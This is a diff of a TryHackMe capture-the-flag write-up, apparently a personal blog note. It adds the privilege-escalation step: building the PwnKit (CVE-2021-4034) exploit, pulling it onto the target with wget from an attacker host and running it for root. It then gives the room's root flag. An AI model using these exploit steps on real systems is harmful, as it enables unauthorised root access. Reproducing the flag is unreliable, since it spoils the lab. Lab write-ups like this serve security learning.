@@ -1,5 +1,5 @@
 ---
-{"dg-publish":true,"permalink":"/try-hack-me-rooms/convert-my-video/","tags":["ethicalhacking","offensivesecurity","tryhackme","pentesting","writeup"],"created":"2026-04-28T07:22:40.350+02:00","updated":"2026-05-04T22:41:06.404+02:00","dg-note-properties":{"tags":["ethicalhacking","offensivesecurity","tryhackme","pentesting","writeup"]}}
+{"dg-publish":true,"permalink":"/try-hack-me-rooms/convert-my-video/","tags":["ethicalhacking","offensivesecurity","tryhackme","pentesting","writeup"],"created":"2026-04-28T07:22:40.350+02:00","updated":"2026-05-05T08:28:29.563+02:00","dg-note-properties":{"tags":["ethicalhacking","offensivesecurity","tryhackme","pentesting","writeup"]}}
 ---
 
 ![](/img/user/Attachments/redteaming2.png)
@@ -346,7 +346,54 @@ This vulnerability is an attacker's dream come true:
 - and it is exploitable even if the polkit daemon itself is not running.
 ```
 
-Since target has an older version of **gcc** it is not possible to compile the exploit and transfer it to target afterwards. Luckily there are multiple approaches with pwnkit. 
+Since target has an older version of **gcc** it is not possible to compile the exploit and transfer it to target afterwards. Luckily there are multiple approaches with pwnkit. The pwnkit exploit has been developed in different languages and with different compilation options. 
+
+**make** is not installed on the target so compiling the exploit on target is not an option. 
+
+### Gaining Root
+
+Second exploit version available [here](https://github.com/berdav/CVE-2021-4034)
+
+```bash
+# cloning the repo
+git clone repo
+
+# entering the repo
+cd pwnkit
+
+# compile the exploit statically
+gcc -o cve-2021-4034 cve-2021-4034.c -static 
+
+# compiling the necessary files other than the main binary 
+make 
+
+# compressing everything to .tar.gz to transfer to target
+tar -czvf pwnkit.tar.gz 'GCONV_PATH=.' gconv-modules pwnkit.so cve-2021-4034
+```
+
+This approach works because compiling the exploit statically and transferring the necessary files from the repo to target in a .tar.gz format doesnt yield any errors on target machine. With the above commands the repo is acquired and the necessary files have been compiled. Lastly, compressing them to .tar.gz enables the transfer. 
+
+```bash
+
+# transferring to target
+wget http://<IP>:<PORT>/pwnkit.tar.gz
+
+# unzipping
+tar -xzvf pwnkit.tar.gz
+
+# making it executable 
+chmod +x cve-2021-4034 
+
+# executing exploit
+./cve-2021-4034
+
+
+```
+
+![](/img/user/Attachments/root%203.png)
+
+At last root is gained. let's acquire the flag. 
+**root flag: ** `flag{d9b368018e912b541a4eb68399c5e94a}`
 
 ------
 ## Attack Pattern Analysis (APA)
